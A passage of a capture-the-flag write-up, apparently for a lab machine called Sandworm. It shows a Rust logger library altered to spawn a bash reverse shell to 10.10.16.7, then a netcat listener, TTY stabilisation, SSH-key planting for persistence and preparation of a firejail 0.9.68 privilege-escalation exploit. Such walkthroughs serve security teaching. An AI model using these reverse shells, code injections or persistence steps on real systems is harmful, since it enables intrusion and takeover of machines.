<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">atlas</span>    <span class="mi">0</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">15</span><span class="p">:</span><span class="mi">54</span> <span class="n">pwned</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">atlas</span>    <span class="mi">0</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">22</span><span class="p">:</span><span class="mi">26</span> <span class="n">pwnedbyelswix</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">8</span><span class="n">aae57c9bffa46e59597f674e82e7e36</span><span class="o">-</span><span class="n">ModemManager</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">eK6wWM</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">8</span><span class="n">aae57c9bffa46e59597f674e82e7e36</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">logind</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">lvZSaH</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">8</span><span class="n">aae57c9bffa46e59597f674e82e7e36</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">resolved</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">fJsry8</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">06</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">8</span><span class="n">aae57c9bffa46e59597f674e82e7e36</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">timesyncd</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">MSQqqG</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">17</span><span class="p">:</span><span class="mi">39</span> <span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">8</span><span class="n">aae57c9bffa46e59597f674e82e7e36</span><span class="o">-</span><span class="n">upower</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">O1cXj7</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">07</span> <span class="n">vmware</span><span class="o">-</span><span class="n">root_809</span><span class="o">-</span><span class="mi">4282301975</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

Great, we're now executing commands as the <code>atlas</code> user. Let's proceed to gain access as the user "atlas."<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> 
<span class="n">extern</span> <span class="n">crate</span> <span class="n">chrono</span><span class="p">;</span>

<span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
<span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">io</span><span class="p">::</span><span class="n">Write</span><span class="p">;</span>
<span class="n">use</span> <span class="n">chrono</span><span class="p">::</span><span class="n">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>

<span class="n">pub</span> <span class="n">fn</span> <span class="n">log</span><span class="p">(</span><span class="n">user</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">query</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">justification</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">let</span> <span class="n">now</span> <span class="o">=</span> <span class="n">Local</span><span class="p">::</span><span class="n">now</span><span class="p">();</span>
    <span class="n">let</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">now</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">"%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S"</span><span class="p">)</span><span class="o">.</span><span class="n">to_string</span><span class="p">();</span>
    <span class="n">let</span> <span class="n">log_message</span> <span class="o">=</span> <span class="nb">format</span><span class="err">!</span><span class="p">(</span><span class="s2">"[</span><span class="si">{}</span><span class="s2">] - User: </span><span class="si">{}</span><span class="s2">, Query: </span><span class="si">{}</span><span class="s2">, Justification: </span><span class="si">{}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">justification</span><span class="p">);</span>

    <span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">process</span><span class="p">::</span><span class="n">Command</span><span class="p">;</span>

    <span class="n">Command</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="s2">"bash"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">arg</span><span class="p">(</span><span class="s2">"-c"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">arg</span><span class="p">(</span><span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.16.7/3001 0&gt;&amp;1"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">spawn</span><span class="p">()</span>
        <span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="s2">"ls command failed to start"</span><span class="p">);</span>





    <span class="n">let</span> <span class="n">mut</span> <span class="n">file</span> <span class="o">=</span> <span class="n">match</span> <span class="n">OpenOptions</span><span class="p">::</span><span class="n">new</span><span class="p">()</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">true</span><span class="p">)</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">true</span><span class="p">)</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">"/opt/tipnet/access.log"</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">file</span><span class="p">,</span>
        <span class="n">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="n">println</span><span class="err">!</span><span class="p">(</span><span class="s2">"Error opening log file: </span><span class="si">{}</span><span class="s2">"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="n">let</span> <span class="n">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">write_all</span><span class="p">(</span><span class="n">log_message</span><span class="o">.</span><span class="n">as_bytes</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">println</span><span class="err">!</span><span class="p">(</span><span class="s2">"Error writing to log file: </span><span class="si">{}</span><span class="s2">"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

Before copying the new <code>lib.rs</code> file to <code>/opt/crates/logger/src/</code>, let's set up our netcat (nc) listener to capture the reverse shell:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
</pre></div>

Now, let's copy the new <code>lib.rs</code> file to <code>/opt/crates/logger/src/</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span>
</pre></div>

After a few minutes of waiting, we have successfully obtained a reverse shell as the user <code>atlas</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.218</span><span class="p">:</span><span class="mf">37366.</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">22106</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
</pre></div>

Now, let's simply adjust the TTY to interact more comfortably with the system:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>

<span class="n">elswix</span><span class="nd">@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
                               <span class="n">reset</span>
<span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
<span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
</pre></div>
<h3><br>Shell as root</br></h3><br>
Upon listing the groups, we notice an interesting group:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">atlas</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">atlas</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">atlas</span><span class="p">),</span><span class="mi">1002</span><span class="p">(</span><span class="n">jailer</span><span class="p">)</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
</pre></div>

Recalling the <code>Set-UID</code> files, firejail was present in the system and was only available for users belonging to the <code>jailer</code> group:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">which</span> <span class="n">firejail</span> <span class="o">|</span> <span class="n">xargs</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">jailer</span> <span class="mi">1777952</span> <span class="n">Nov</span> <span class="mi">29</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
</pre></div>

Let's check the version of firejail:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">firejail</span> <span class="o">--</span><span class="n">version</span>
<span class="n">firejail</span> <span class="n">version</span> <span class="mf">0.9.68</span>

<span class="n">Compile</span> <span class="n">time</span> <span class="n">support</span><span class="p">:</span>
    <span class="o">-</span> <span class="n">always</span> <span class="n">force</span> <span class="n">nonewprivs</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">disabled</span>
    <span class="o">-</span> <span class="n">AppArmor</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">disabled</span>
    <span class="o">-</span> <span class="n">AppImage</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">chroot</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">D</span><span class="o">-</span><span class="n">BUS</span> <span class="n">proxy</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">file</span> <span class="n">transfer</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">firetunnel</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">networking</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">output</span> <span class="n">logging</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">overlayfs</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">disabled</span>
    <span class="o">-</span> <span class="n">private</span><span class="o">-</span><span class="n">home</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">private</span><span class="o">-</span><span class="n">cache</span> <span class="ow">and</span> <span class="n">tmpfs</span> <span class="k">as</span> <span class="n">user</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">SELinux</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">disabled</span>
    <span class="o">-</span> <span class="n">user</span> <span class="n">namespace</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
    <span class="o">-</span> <span class="n">X11</span> <span class="n">sandboxing</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>

<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
</pre></div>

After conducting some research on the internet, I discovered a vulnerability associated with this version.<br/><br/>
There is an advisory on GitHub regarding this vulnerability: <a href="https://github.com/advisories/GHSA-m2xv-wgqg-4gxh">GHSA-m2xv-wgqg-4gxh</a>.<br/><br/>
<em>A Privilege Context Switching issue was discovered in join.c in Firejail 0.9.68. By crafting a bogus Firejail container that is accepted by the Firejail setuid-root program as a join target, a local attacker can enter an environment in which the Linux user namespace is still the initial user namespace, the NO_NEW_PRIVS prctl is not activated, and the entered mount namespace is under the attacker's control. In this way, the filesystem layout can be adjusted to gain root privileges through execution of available setuid-root binaries such as su or sudo.</em><br/><br/>
I also came across the following <a href="https://www.openwall.com/lists/oss-security/2022/06/08/10">article</a>, which details the vulnerability. The article includes a PoC exploit in this <a href="https://www.openwall.com/lists/oss-security/2022/06/08/10/1">section</a>.<br/><br/>
Let's proceed to exploit this vulnerability. First, I will download the exploit on my local machine:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">lists</span><span class="o">/</span><span class="n">oss</span><span class="o">-</span><span class="n">security</span><span class="o">/</span><span class="mi">2022</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">1</span> <span class="o">-</span><span class="n">O</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="o">--</span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">19</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">31</span><span class="o">--</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">lists</span><span class="o">/</span><span class="n">oss</span><span class="o">-</span><span class="n">security</span><span class="o">/</span><span class="mi">2022</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">1</span>
<span class="n">Resolving</span> <span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">...</span> <span class="mf">195.42.179.202</span>
<span class="n">Connecting</span> <span class="n">to</span> <span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">|</span><span class="mf">195.42.179.202</span><span class="o">|</span><span class="p">:</span><span class="mf">443.</span><span class="o">..</span> <span class="n">connected</span><span class="o">.</span>
<span class="n">HTTP</span> <span class="n">request</span> <span class="n">sent</span><span class="p">,</span> <span class="n">awaiting</span> <span class="n">response</span><span class="o">...</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Length</span><span class="p">:</span> <span class="mi">8649</span> <span class="p">(</span><span class="mf">8.4</span><span class="n">K</span><span class="p">)</span> <span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">]</span>
<span class="n">Saving</span> <span class="n">to</span><span class="p">:</span> <span class="err">‘</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="err">’</span>

<span class="n">exploit</span><span class="o">.</span><span class="n">py</span>                       <span class="mi">100</span><span class="o">%</span><span class="p">[</span><span class="o">=======================================================&gt;</span><span class="p">]</span>   <span class="mf">8.45</span><span class="n">K</span>  <span class="mf">40.7</span><span class="n">KB</span><span class="o">/</span><span class="n">s</span>    <span class="ow">in</span> <span class="mf">0.2</span><span class="n">s</span>    

<span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">19</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">32</span> <span class="p">(</span><span class="mf">40.7</span> <span class="n">KB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="o">-</span> <span class="err">‘</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="err">’</span> <span class="n">saved</span> <span class="p">[</span><span class="mi">8649</span><span class="o">/</span><span class="mi">8649</span><span class="p">]</span>
</pre></div>

Before executing the exploit on the victim machine, I recommend obtaining a second shell as <code>atlas</code>, as you will need a second terminal to exploit the vulnerability.<br/><br/>
You can send another reverse shell by manipulating the SSH <code>authorized_keys</code> file. First, generate new SSH keys:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span>
<span class="n">Generating</span> <span class="n">public</span><span class="o">/</span><span class="n">private</span> <span class="n">rsa</span> <span class="n">key</span> <span class="n">pair</span><span class="o">.</span>
<span class="n">Enter</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">which</span> <span class="n">to</span> <span class="n">save</span> <span class="n">the</span> <span class="n">key</span> <span class="p">(</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">):</span> 
<span class="n">Enter</span> <span class="n">passphrase</span> <span class="p">(</span><span class="n">empty</span> <span class="k">for</span> <span class="n">no</span> <span class="n">passphrase</span><span class="p">):</span> 
<span class="n">Enter</span> <span class="n">same</span> <span class="n">passphrase</span> <span class="n">again</span><span class="p">:</span> 
<span class="n">Your</span> <span class="n">identification</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="ow">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
<span class="n">Your</span> <span class="n">public</span> <span class="n">key</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="ow">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span>
<span class="n">The</span> <span class="n">key</span> <span class="n">fingerprint</span> <span class="ow">is</span><span class="p">:</span>
<span class="n">SHA256</span><span class="p">:</span><span class="mi">8</span><span class="n">TZim4s6Vpe3kwlfHcXFbSMaEtQuK4aOFmdp8HsQCTI</span> <span class="n">elswix</span><span class="nd">@kali</span>
<span class="n">The</span> <span class="n">key</span><span class="s1">'s randomart image is:</span>
<span class="o">+---</span><span class="p">[</span><span class="n">RSA</span> <span class="mi">3072</span><span class="p">]</span><span class="o">----+</span>
<span class="o">|</span>        <span class="o">.</span><span class="n">oo</span>    <span class="n">o</span><span class="o">+|</span>
<span class="o">|</span> <span class="n">E</span> <span class="o">.</span>     <span class="o">.</span> <span class="n">o</span> <span class="o">.</span> <span class="o">.*|</span>
<span class="o">|</span>  <span class="n">o</span> <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="n">o</span> <span class="n">o</span> <span class="o">.</span><span class="n">o</span><span class="o">.|</span>
<span class="o">|</span>   <span class="o">.</span> <span class="n">o</span>   <span class="o">+</span> <span class="n">o</span>  <span class="o">.</span>  <span class="o">|</span>
<span class="o">|</span>    <span class="n">o</span> <span class="o">+</span> <span class="n">S</span><span class="o">.*</span>  <span class="o">.</span> <span class="o">.</span> <span class="o">|</span>
<span class="o">|</span>   <span class="o">.</span> <span class="n">O</span><span class="o">.++*...</span> <span class="o">.</span>  <span class="o">|</span>
<span class="o">|</span>    <span class="n">B</span><span class="o">.+.++</span> <span class="o">=</span>     <span class="o">|</span>
<span class="o">|</span>   <span class="n">ooo</span> <span class="n">o</span> <span class="o">.*</span>      <span class="o">|</span>
<span class="o">|</span>  <span class="o">...</span><span class="n">oo</span> <span class="o">.</span>  <span class="o">.</span>     <span class="o">|</span>
<span class="o">+----</span><span class="p">[</span><span class="n">SHA256</span><span class="p">]</span><span class="o">-----+</span>
</pre></div>

After that, copy the public key and save it as an <code>authorized_keys</code> file on the victim machine:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCm6SAEfouJqmdkjQ9xfzlb+g+pff/BS5sHIkPfir/KqDSR0V4TRCwKrpzs3J7ZilhvjurIFPoi5PA0wcX/9Sh8snmeh9yrQD1aJGZNBLGB//wX0j/r5vA6FSdRRA+6V2tyxmb4W/IbpBtePcSqGh7sGn1TzysyudMml3RUEPSOeUnBbFvLimm6etauY6VfTn6X2+P8SPT2+7QR+5HeBh88fs6z3P4Z9axWZ/8rRBE0zSR5UJijv1O8FwsLSoLX/KpJiADNcBrMLxxq2TRkVVYjJd2K4uwsJDg9XxTGgId9jzw3nnbyVS2ld0zDSV+D5mZa4lwErgkkYb5S+O/Ol3Uec8OnkVsRQV5I4JmBpMW3suess03BzT7osQIDzoyI7H3RjRTeD6SGhlpWf1yFWt2LZc/SXHXCa3oAk9RRPAMXigKJQIdcNI897Zhci6iN7Pv7JyutgXTNCimX2jnqo6H572CqkLUtBGjAaistcJVnqBjWW1RI6krpsOuIgSpCTYs= elswix@kali'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span> 
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

Now, you can access as "atlas" through SSH without specifying credentials:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">atlas</span><span class="o">@</span><span class="mf">10.10.11.218</span>
<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">73</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>

 <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
 <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
